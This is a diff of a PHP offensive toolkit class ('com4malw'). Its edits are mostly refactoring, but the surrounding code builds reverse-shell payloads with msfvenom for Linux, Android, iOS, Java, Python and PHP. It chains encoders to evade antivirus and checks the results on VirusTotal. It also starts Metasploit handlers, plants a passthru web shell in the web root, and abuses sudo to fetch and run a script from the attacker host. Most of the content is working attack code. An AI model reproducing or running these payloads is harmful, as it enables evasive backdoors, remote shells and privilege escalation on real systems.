@@ -56,9 +56,9 @@ class com4malw extends com4net{
             return $this->backdoor_linux_msf2c2rev();
         }
         
-        $file_c = new FILE("$this->file_dir/$this->file_name.h");
+        $file_c = new FILE("","$this->file_dir/$this->file_name.h");
         $file_elf = $file_c->file_c2elf("-m32");
-        $this->file_file2virus2vt();
+        $this->file2virus2vt();
         $this->elf2info();$this->pause();
         
         $cmd1 = "nc -l -p $this->attacker_port -v -n";
@@ -120,8 +120,8 @@ CODE;
         $this->ssTitre(__FUNCTION__);
         $this->cmd("localhost","msfconsole -q -x \"use exploit/multi/handler;set payload linux/x86/shell_reverse_tcp;set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
         $query = "msfvenom --payload linux/x86/shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 10 --format raw | msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform linux --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform linux --format raw | msfvenom  -a x86 -e x86/shikata_ga_nai --iterations 10  --platform linux --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform linux --format raw | msfvenom -a x86 -e x86/alpha_mixed BufferRegister=EAX  --platform linux --format raw |  msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform linux --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform linux --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform linux --format raw | msfvenom -a x86 -e x86/shikata_ga_nai --iterations 10  --platform linux --format elf ";
-        //$query = "msfvenom --payload linux/x86/shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 10 --format raw | msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform linux --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform linux --format raw | msfvenom  -a x86 -e x86/shikata_ga_nai --iterations 10  --platform linux --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform linux --format raw |  msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform linux --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform linux --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform linux --format raw | msfvenom -a x86 -e x86/shikata_ga_nai --iterations 10  --platform linux --format elf -o $this->file_path";
-        //$query = "msfvenom --payload linux/x86/shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 40 --format raw | msfvenom -a x86 -e x86/jmp_call_additive --iterations 10  --platform linux --format raw | msfvenom  -a x86 -e x86/shikata_ga_nai --iterations 40  --platform linux --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 10  --platform linux --format raw |  msfvenom -a x86 -e x86/jmp_call_additive --iterations 10  --platform linux --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 10  --platform linux --format raw | msfvenom -a x86 -e x86/shikata_ga_nai --iterations 40  --platform linux --format elf -o $this->file_path";
+        //$query = "msfvenom --payload linux/x86/shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 10 --format raw | msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform linux --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform linux --format raw | msfvenom  -a x86 -e x86/shikata_ga_nai --iterations 10  --platform linux --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform linux --format raw |  msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform linux --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform linux --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform linux --format raw | msfvenom -a x86 -e x86/shikata_ga_nai --iterations 10  --platform linux --format elf -qO $this->file_path";
+        //$query = "msfvenom --payload linux/x86/shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 40 --format raw | msfvenom -a x86 -e x86/jmp_call_additive --iterations 10  --platform linux --format raw | msfvenom  -a x86 -e x86/shikata_ga_nai --iterations 40  --platform linux --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 10  --platform linux --format raw |  msfvenom -a x86 -e x86/jmp_call_additive --iterations 10  --platform linux --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 10  --platform linux --format raw | msfvenom -a x86 -e x86/shikata_ga_nai --iterations 40  --platform linux --format elf -qO $this->file_path";
         return $this->req_ret_str($query);
     }
     
@@ -146,7 +146,7 @@ CODE;
             sleep(3 );
             $this->file_msf2root($cmd );
         }
-        $file_h = new file("$this->file_dir/$this->file_name"."_$hash.h");
+        $file_h = new FILE("","$this->file_dir/$this->file_name"."_$hash.h");
         $hex = $file_h->file_h2hex();
         $flag = $this->payload2check4norme($hex,$this->badchars);
         if ($flag == false) {
@@ -188,9 +188,9 @@ CODE;
         
         if(!empty($file_exploit)){
             
-            $obj_file = new FILE($file_exploit);
+            $obj_file = new FILE("",$file_exploit);
             
-            $obj_file->file_file2info();
+            $obj_file->file2info();
             $this->article("EXTENSION",$obj_file->file_ext);
             $this->requette("cp -v $obj_file->file_path $this->dir_tmp/$obj_file->file_name$obj_file->file_ext ");
             
@@ -198,7 +198,7 @@ CODE;
                 $ip_attacker = $this->ip4addr4target($this->ip);
                 //$this->requette("gedit $obj_file->file_path");
                 $this->tcp2open4server($ip_attacker, $this->port_rfi);
-                    $data = "wget http://$ip_attacker:$this->port_rfi/$obj_file->file_name$obj_file->file_ext -O  /tmp/$obj_file->file_name$obj_file->file_ext "; //
+                    $data = "wget http://$ip_attacker:$this->port_rfi/$obj_file->file_name$obj_file->file_ext -qO  /tmp/$obj_file->file_name$obj_file->file_ext "; //
                     $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
@@ -414,9 +414,9 @@ perl -e 'exec \"$shell\";'");
     public function rev8convert($ip_attacker, $rport,$app,$shell){
         $this->ssTitre(__FUNCTION__);
         $file = "/tmp/rev8sh_$ip_attacker.$rport.sh";
-        $obj_file = new FILE($file);
+        $obj_file = new FILE("",$file);
         $obj_file->rev8sh($ip_attacker, $rport);
-        $rev = "wget http://$ip_attacker:$this->port_rfi/$obj_file->file_name$obj_file->file_ext -O /tmp/$obj_file->file_name$obj_file->file_ext && chmod +x /tmp/$obj_file->file_name$obj_file->file_ext && $shell /tmp/$obj_file->file_name$obj_file->file_ext"; //
+        $rev = "wget http://$ip_attacker:$this->port_rfi/$obj_file->file_name$obj_file->file_ext -qO /tmp/$obj_file->file_name$obj_file->file_ext && chmod +x /tmp/$obj_file->file_name$obj_file->file_ext && $shell /tmp/$obj_file->file_name$obj_file->file_ext"; //
         $data = "echo '$this->root_passwd' | sudo -S $app 'https://127.0.0.1\"| $rev\"' /tmp/out.png 2> /dev/null";
         $this->lan2root4check2server($rport,"root8sudoers=".__FUNCTION__."=sudo -l $this->uid_name:$this->uid_pass@sudo $app", $data,600);
     }
@@ -664,7 +664,7 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
         
         $this->requette("gedit $this->file_dir/sh.php" );
         $this->requette("php $this->file_dir/sh.php" );
-        $file_sh = new file("$this->file_dir/sh.php" );$file_sh->file_file2virus2vt();
+        $file_sh = new FILE("","$this->file_dir/sh.php" );$file_sh->file2virus2vt();
         $this->pause();
         $this->rev8php_simple();$this->pause();
         $this->requette("echo \"<?php passthru(\\\$_REQUEST[\\\"cmd\\\"]);?>\" | sudo tee /var/www/html/passthru.php " );
@@ -746,19 +746,19 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
     
     public function rev8media_android($attacker_ip,$attacker_port,$shell) {
         $this->ssTitre(__FUNCTION__);
-        $query = "msfvenom --payload android/meterpreter/reverse_tcp LHOST=$attacker_ip LPORT=$attacker_port -a dalvik --platform android --encoder x86/shikata_ga_nai --iterations 1 --format raw -o $this->file_path";
+        $query = "msfvenom --payload android/meterpreter/reverse_tcp LHOST=$attacker_ip LPORT=$attacker_port -a dalvik --platform android --encoder x86/shikata_ga_nai --iterations 1 --format raw -qO $this->file_path";
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->prof,$query);
-        $this->file_file2virus2vt(); // 44 / 57
+        $this->file2virus2vt(); // 44 / 57
         return $this;
     }
     
     public function rev8media_ios($attacker_ip,$attacker_port,$shell) {
         $this->ssTitre(__FUNCTION__);
-        $query = "msfvenom --payload osx/armle/shell_reverse_tcp LHOST=$attacker_ip LPORT=$attacker_port -a armle --platform OSX --encoder x86/shikata_ga_nai --iterations 1 --format raw -o $this->file_path";
+        $query = "msfvenom --payload osx/armle/shell_reverse_tcp LHOST=$attacker_ip LPORT=$attacker_port -a armle --platform OSX --encoder x86/shikata_ga_nai --iterations 1 --format raw -qO $this->file_path";
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->prof,$query);
-        $this->file_file2virus2vt(); // 44 / 57
+        $this->file2virus2vt(); // 44 / 57
         return $this;
     }
     
@@ -771,7 +771,7 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
         $query = "echo '<?php system(\"nc $attacker_ip $attacker_port -v -e $shell\")?>' > $this->file_path";
         if (!file_exists($this->file_path))$this->requette($query);
         else $this->cmd($attacker_ip,$query);
-        $this->file_file2virus2vt();
+        $this->file2virus2vt();
         return $this;
     }
     
@@ -786,10 +786,10 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
          * p.waitFor()
          */
         $this->cmd($this->prof,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD java/shell_reverse_tcp ; set LHOST $attacker_ip;set LPORT $attacker_port;run;\" ");
-        $query = "msfvenom --payload java/shell_reverse_tcp LHOST='$attacker_ip' LPORT=$attacker_port --format jar -o $this->file_path ";
+        $query = "msfvenom --payload java/shell_reverse_tcp LHOST='$attacker_ip' LPORT=$attacker_port --format jar -qO $this->file_path ";
         if (!file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->prof,$query);
-        $this->file_file2virus2vt();
+        $this->file2virus2vt();
         //$vmx = new VM($target);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
         $this->cmd("Target","java -jar $this->file_path ");
         return $this;
@@ -802,10 +802,10 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
         // python/shell_reverse_tcp
         // msfvenom -p cmd/unix/reverse_python lhost=192.168.1.110 lport=4444 R
         $this->cmd($this->prof,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp ; set LHOST $attacker_ip;set LPORT $attacker_port;run;\" ");
-        $query = "msfvenom --payload  python/meterpreter/reverse_tcp LHOST='$attacker_ip' LPORT=$attacker_port --format raw -o $this->file_path";
+        $query = "msfvenom --payload  python/meterpreter/reverse_tcp LHOST='$attacker_ip' LPORT=$attacker_port --format raw -qO $this->file_path";
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->prof,$query);
-        $this->file_file2virus2vt();
+        $this->file2virus2vt();
         //$vmx = new VM($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
         $this->cmd("Target","python $this->file_path ");
         return $this; // 1 / 53
@@ -814,10 +814,10 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
     public function rev8python_netcat($attacker_ip,$attacker_port,$shell) {
         $this->ssTitre(__FUNCTION__);
         $this->cmd($this->prof,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD python/shell_reverse_tcp ; set LHOST $attacker_ip;set LPORT $attacker_port;run;\" ");
-        $query = "msfvenom --payload  python/shell_reverse_tcp LHOST='$attacker_ip' LPORT=$attacker_port R --format raw -o $this->file_path";
+        $query = "msfvenom --payload  python/shell_reverse_tcp LHOST='$attacker_ip' LPORT=$attacker_port R --format raw -qO $this->file_path";
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->prof,$query);
-        $this->file_file2virus2vt();
+        $this->file2virus2vt();
         //$vmx = new VM($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
         $this->cmd("Target","python $this->file_path ");
         return $this;
@@ -826,10 +826,10 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
     public function rev8php_simple($attacker_ip,$attacker_port,$shell) {
         $this->ssTitre(__FUNCTION__);
         $this->cmd($this->prof,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp ; set LHOST $attacker_ip;set LPORT $attacker_port;run;\" ");
-        $query = "msfvenom --payload  php/meterpreter/reverse_tcp LHOST='$attacker_ip' LPORT=$attacker_port  --format raw -o $this->file_path" ;
+        $query = "msfvenom --payload  php/meterpreter/reverse_tcp LHOST='$attacker_ip' LPORT=$attacker_port  --format raw -qO $this->file_path" ;
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->prof,$query);
-        $this->file_file2virus2vt();
+        $this->file2virus2vt();
         //$vmx = new VM($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
         $this->cmd("Target","php $this->file_path ");
         return $this;
@@ -847,7 +847,7 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
         $query = "echo '<?php $backdoor ?>' > $this->file_path";
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->prof,$query);
-        $this->file_file2virus2vt();
+        $this->file2virus2vt();
         //$vmx = new VM($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
         $this->cmd("Target","php -f $this->file_path ");
         return $this;
@@ -859,7 +859,7 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
         $query = "echo '<?php' > $this->file_path;msfvenom --payload  php/reverse_php --platform php --arch php  LHOST=$attacker_ip LPORT=$attacker_port --format raw  >> $this->file_path ;echo '?>' >> $this->file_path";
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->prof,$query);
-        $this->file_file2virus2vt();
+        $this->file2virus2vt();
         //$vmx = new VM($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
         $this->cmd("Target","php $this->file_path ");
         return $this;
